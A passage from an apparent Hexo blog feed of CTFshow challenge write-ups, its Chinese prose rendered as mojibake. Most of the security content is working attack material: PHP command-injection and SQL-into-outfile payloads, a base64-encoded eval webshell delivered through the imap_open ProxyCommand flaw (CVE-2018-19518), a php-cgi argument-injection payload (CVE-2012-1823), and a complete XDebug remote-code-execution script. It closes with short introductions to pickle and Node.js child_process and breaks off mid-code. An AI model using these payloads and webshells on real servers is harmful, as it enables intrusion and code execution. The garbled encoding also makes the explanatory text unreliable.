class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡ŒåŒ¹é…äº†ä¸€ä¸ªipåœ°å€ï¼Œä¸Šé¢payloadæ”¹ä¸€ä¸‹å°±è¡Œ</p><p><strong>405</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\/[A-Za-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\.|php/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªåœ¨hostä¸­åŒ¹é…IPåœ°å€ï¼Œç¬¬äºŒä¸ªpathä¸èƒ½æœ‰å­—æ¯æ•°å­—ï¼Œç¬¬ä¸‰ä¸ªåè®®ä¸­éœ€è¦æœ‰php</p><p>æœ€ç»ˆpayloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;php:&#x2F;&#x2F;127.0.0.1;cat fl0g.php&gt; 1.txt;11&#x2F;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>406</strong></p><p><code>filter_var</code>å‡½æ•°<a href="https://www.cnblogs.com/lxfweb/p/13757525.html">ç¼ºé™·</a></p><p>è¿™é‡Œè¿‡æ»¤å™¨åœ¨éªŒè¯urlçš„åˆæ³•æ€§</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;0:&#x2F;&#x2F;www.baidu.com;&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;4.php&quot;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¿é—®4.phpåè®¿é—®1.txtå³å¯</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowphpCVE</title>
      <link href="/posts/85a6a528.html"/>
      <url>/posts/85a6a528.html</url>
      
        <content type="html"><![CDATA[<p><strong>311</strong></p><p>PHPç‰ˆæœ¬7.1.33dev</p><p>CVE-2019-11043</p><p><a href="https://github.com/neex/phuip-fpizdam">åˆ©ç”¨è„šæœ¬</a></p><p><strong>312</strong></p><p>PHPç‰ˆæœ¬5.6.38</p><p>CVE-2018-19518</p><p>æ¼æ´æˆå› </p><blockquote><p>IMAPåè®®ï¼ˆå› ç‰¹ç½‘æ¶ˆæ¯è®¿é—®åè®®ï¼‰å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯é‚®ä»¶å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è¿™ç§åè®®ä»é‚®ä»¶æœåŠ¡å™¨ä¸Šè·å–é‚®ä»¶çš„ä¿¡æ¯ï¼Œä¸‹è½½é‚®ä»¶ç­‰ã€‚å®ƒè¿è¡Œåœ¨TCP/IPåè®®ä¹‹ä¸Šï¼Œä½¿ç”¨çš„ç«¯å£æ˜¯143ã€‚åœ¨phpä¸­è°ƒç”¨çš„æ˜¯imap_openå‡½æ•°</p><p><code>imap_open( string $mailbox,string $user,string $passwordï¼‰</code></p><p>å…¶ä¸­å‚æ•°mailbox,æ˜¯ç”¨æ¥è¿æ¥é‚®ç®±æœåŠ¡å™¨çš„ã€‚å®ƒä¼šè°ƒç”¨rshæ¥è¿æ¥è¿œç¨‹shellè€Œï¼Œdebian/ubuntuä¸­é»˜è®¤ä½¿ç”¨sshæ¥ä»£æ›¿rshï¼Œåˆå› ä¸ºsshå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡è®¾ç½®<code>-oProxyCommand=</code>æ¥è°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤ï¼Œæ‰€ä»¥æ”»å‡»è€…é€šè¿‡æ³¨å…¥è¿™ä¸ªå‚æ•°ï¼Œæœ€ç»ˆå°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p></blockquote><p>ç„¶åå¯¹è‡ªå·±æƒ³è¦å‘çš„å†…å®¹è¿›è¡Œä¸€æ¬¡base64ç¼–ç </p><p>é¦–å…ˆå¯¹<code>&lt;?php @eval($_POST[kkk]);?&gt;</code>è¿›è¡Œä¸€æ¬¡base64ç¼–ç </p><p>ç„¶åå¯¹<code>echo &quot;ä¸Šä¸ªç¼–ç å†…å®¹&quot; | base64 -d &gt;shell.php</code>è¿›è¡Œä¸€æ¬¡base64ç¼–ç </p><p>æ³¨æ„ï¼šå¦‚æœè¿›è¡Œbase64ç¼–ç åï¼Œå«æœ‰+ =ï¼Œéƒ½è¦è¿›è¡Œurlç¼–ç å³%2b %3dï¼Œæ‰€ä»¥ä¸ºäº†ä¿è¯ä¸ä¼šå‡ºé”™ï¼Œæœ€å¥½å†å¯¹å¾—åˆ°çš„base64ç¼–ç åçš„å­—ç¬¦ä¸²å†è¿›è¡Œurlç¼–ç ã€‚ç›¸å½“äºæ­¥éª¤ä¸ºå…ˆbase64ç¼–ç ï¼Œå†urlç¼–ç </p><p>ç„¶åå°†hostnameçš„å†…å®¹æ›¿æ¢æˆ<code>x+-oProxyCommand%3decho%09ç¼–ç åçš„å†…å®¹|base64%09-d|sh&#125;</code></p><pre class="line-numbers language-none"><code class="language-none">hostname&#x3D;x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzJ0cmExMHBPejgrInxiYXNlNjQgLWQgPnNoZWxsLnBocA&#x3D;&#x3D;|base64%09-d|sh&#125;&amp;username&#x3D;1&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>313</strong></p><p>PHPç‰ˆæœ¬5.4.1</p><p>CVE-2012-1823</p><p>è¯¥æ¼æ´å…·ä½“æˆå› å¯è§<a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">Pç¥åšå®¢</a></p><blockquote><p>å‘½ä»¤è¡Œå‚æ•°ä¸å…‰å¯ä»¥é€šè¿‡<code>#!/usr/local/bin/php-cgi -d include_path=/path</code>çš„æ–¹å¼ä¼ å…¥php-cgiï¼Œæ›´å¯ä»¥é€šè¿‡querystringçš„æ–¹å¼ä¼ å…¥ã€‚</p><p>é€šè¿‡é˜…è¯»æºç ï¼Œæˆ‘å‘ç°cgiæ¨¡å¼ä¸‹æœ‰å¦‚ä¸‹ä¸€äº›å‚æ•°å¯ç”¨ï¼š</p><ul><li><code>-c</code> æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½®</li><li><code>-n</code> ä¸è¦åŠ è½½php.iniæ–‡ä»¶</li><li><code>-d</code> æŒ‡å®šé…ç½®é¡¹</li><li><code>-b</code> å¯åŠ¨fastcgiè¿›ç¨‹</li><li><code>-s</code> æ˜¾ç¤ºæ–‡ä»¶æºç </li><li><code>-T</code> æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶</li><li><code>-h</code>å’Œ<code>-?</code> æ˜¾ç¤ºå¸®åŠ©</li></ul></blockquote><p>ç®€å•æ¥è¯´ï¼Œå°±å¯ä»¥é€šè¿‡å‚æ•°ä¼ é€’é€šè¿‡ä»¥ä¸Šçš„å‚æ•°ç±»å‹ä¼ å…¥ä¸åŒçš„å†…å®¹åœ¨æ‰§è¡Œphpæ—¶è¢«ä¼ å…¥</p><p>å¯é€šè¿‡-dç›´æ¥ä¿®æ”¹phpä¸­çš„é…ç½®é¡¹æ¥è¾¾åˆ°æˆ‘ä»¬ä»»æ„å†™å…¥çš„æ•ˆæœ</p><pre class="line-numbers language-none"><code class="language-none">payload:?-d+allow_url_include%&#x3D;on+&#x3D;auto_append_file&#x3D;php:&#x2F;&#x2F;inputPOST:&lt;?php system(&#39;nl &#x2F;somewhere&#x2F;fla9.txt&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>314</strong></p><p>åŒ…å«æ—¥å¿—æ–‡ä»¶å°±è¿‡äº†////////////</p><p><strong>315</strong></p><p>PHPç‰ˆæœ¬7.1.12ï¼Œdebugå¼€å¯ï¼Œç«¯å£9000</p><blockquote><p>å½±å“</p><p>XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®remote_connect_back = 1ï¼š</p><pre class="line-numbers language-none"><code class="language-none">xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®<a href="http://target/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target/index.php?XDEBUG_SESSION_START=phpstormï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–X-Forwarded-Forå¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚</a></p></blockquote><p>ç¼–å†™å¥½çš„è„šæœ¬ï¼Œè¦åœ¨å…¬ç½‘IPä¸‹ä½¿ç”¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">import</span> argparse<span class="token keyword">import</span> socket<span class="token keyword">import</span> base64<span class="token keyword">import</span> binascii<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutorpool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">recv_xml</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>    blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> <span class="token string">b''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> data <span class="token operator">+</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">while</span> data<span class="token punctuation">:</span>            eop <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> eop <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            blocks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span>eop<span class="token punctuation">]</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> data<span class="token punctuation">[</span>eop<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>blocks<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">return</span> blocks<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">trigger</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?XDEBUG_SESSION_START=phpstorm'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'XDebug remote debug code execution.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'the code you want to execute.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--target'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target url.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-l'</span><span class="token punctuation">,</span> <span class="token string">'--listen'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'local port'</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip_port <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>listen<span class="token punctuation">)</span>    sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ip_port<span class="token punctuation">)</span>    sk<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>trigger<span class="token punctuation">,</span> args<span class="token punctuation">.</span>target<span class="token punctuation">)</span>    conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> sk<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'eval -i 1 -- '</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> recv_xml<span class="token punctuation">(</span>conn<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Recieve data: '</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb'&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>'</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> g<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] No result...'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> g<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Result: '</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] May be not string result...'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¯å¢ƒå¯„äº†ï¼Œæ²¡å¾—ç»“æœ</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python pickleååºåˆ—åŒ–</title>
      <link href="/posts/76010d11.html"/>
      <url>/posts/76010d11.html</url>
      
        <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯pickle"><a href="#ä»€ä¹ˆæ˜¯pickle" class="headerlink" title="ä»€ä¹ˆæ˜¯pickle"></a>ä»€ä¹ˆæ˜¯pickle</h3><p>pickleæ˜¯Pythonä¸“ç”¨çš„ä¸€ä¸ªè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å·¥å…·åŒ…ï¼Œpickleèƒ½è¡¨ç¤ºPythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œç”±ä¸€ç³»åˆ—opcodeç»„æˆï¼Œæ¨¡æ‹Ÿäº†ç±»ä¼¼å †æ ˆçš„å†…å­˜ã€‚</p><p>ä¸PHPåºåˆ—åŒ–æˆ–è€…JSONï¼Œè¿™äº›ä»¥é”®å€¼å¯¹å½¢å¼å­˜å‚¨åºåˆ—åŒ–å¯¹è±¡æ•°æ®çš„ä¸åŒï¼Œpickle åºåˆ—åŒ–ï¼ˆPythonç‹¬æœ‰ï¼‰æ˜¯å°†ä¸€ä¸ª <code>Python å¯¹è±¡</code>åŠå…¶æ‰€æ‹¥æœ‰çš„å±‚æ¬¡ç»“æ„å˜æˆå¯ä»¥æŒä¹…åŒ–å‚¨å­˜çš„<code>äºŒè¿›åˆ¶æ•°æ®</code>ï¼Œæ— æ³•åƒJSON ä¸€æ ·ç›´è§‚é˜…è¯»ã€‚åœ¨Pythonä¸­ï¼Œé‡‡ç”¨æœ¯è¯­ <code>å°å­˜ (pickling)</code>å’Œ<code> è§£å° (unpickling)</code>æ¥æè¿°åºåˆ—åŒ–ã€‚</p><h4 id="å¯åºåˆ—åŒ–çš„å¯¹è±¡"><a href="#å¯åºåˆ—åŒ–çš„å¯¹è±¡" class="headerlink" title="å¯åºåˆ—åŒ–çš„å¯¹è±¡"></a><strong>å¯åºåˆ—åŒ–çš„å¯¹è±¡</strong></h4><p>èŠ‚é€‰è‡ªå®˜æ–¹æ–‡æ¡£ï¼špickle â€” Python å¯¹è±¡åºåˆ—åŒ–</p><blockquote><p>None, True, å’ŒFalse;<br>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°ï¼›<br>å­—ç¬¦ä¸²ã€å­—èŠ‚ã€å­—èŠ‚æ•°ç»„ï¼›<br>å…ƒç»„ã€åˆ—è¡¨ã€é›†åˆå’Œä»…åŒ…å«å¯æå–å¯¹è±¡çš„å­—å…¸ï¼›<br>åœ¨æ¨¡å—é¡¶å±‚å®šä¹‰çš„å‡½æ•°ï¼ˆå†…ç½®çš„å’Œç”¨æˆ·å®šä¹‰çš„ï¼‰ï¼ˆä½¿ç”¨defï¼Œä¸æ˜¯lambdaï¼‰ï¼›<br>åœ¨æ¨¡å—é¡¶å±‚å®šä¹‰çš„ç±»ï¼›<br>æŸäº›ç±»å®ä¾‹ï¼Œè¿™äº›ç±»çš„ <code>__dict__ </code>å±æ€§å€¼æˆ–<code> __getstate__()</code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«å°å­˜ï¼ˆè¯¦æƒ…å‚é˜… å°å­˜ç±»å®ä¾‹ è¿™ä¸€æ®µï¼‰ã€‚</p></blockquote><h4 id="æ‰‹æ“opcode"><a href="#æ‰‹æ“opcode" class="headerlink" title="æ‰‹æ“opcode"></a>æ‰‹æ“opcode</h4><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowNodejs</title>
      <link href="/posts/56040919.html"/>
      <url>/posts/56040919.html</url>
      
        <content type="html"><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p>é¦–å…ˆè¦çŸ¥é“nodejsæ˜¯å•¥ï¼Œå…¶å®å°±æ˜¯javascriptçš„åç«¯ç‰ˆæœ¬</p><p>ä¸€äº›æœ‰çš„æ²¡çš„çš„å…¥é—¨çŸ¥è¯†</p><p><a href="https://xz.aliyun.com/t/7752#toc-5">nodejsä¸€äº›å…¥é—¨ç‰¹æ€§&amp;&amp;å®æˆ˜</a></p><p><strong>nodejsè°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼</strong></p><p>å¦‚æœä½ è¦æ˜¯ä½¿ç”¨nodejsï¼Œä½ éœ€è¦è°ƒç”¨å¼•ç”¨<code>child_process</code>æ¨¡å—ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> exec <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exec<span class="token punctuation">;</span><span class="token keyword">var</span> cmd <span class="token operator">=</span> <span class="token string">'prince -v builds/pdf/book.html -o builds/pdf/book.pdf'</span><span class="token punctuation">;</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// è·å–å‘½ä»¤æ‰§è¡Œçš„è¾“å‡º</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>child_process.exec</code>æ¥åœ¨nodejsç¨‹åºé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å¦‚æœä½ æƒ³åœ¨shellé‡Œæ‰§è¡Œå‘½ä»¤å¹¶ä¸”è¦å¤„ç†å‘½ä»¤è¾“å‡ºçš„I/Oæ•°æ®æµï¼Œè¾“å‡ºçš„ä½“ç§¯æ¯”è¾ƒå¤§çš„è¯ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>child_process.spawn</code>ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> spawn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>spawn<span class="token punctuation">;</span><span class="token keyword">var</span> child <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'prince'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>  <span class="token string">'-v'</span><span class="token punctuation">,</span> <span 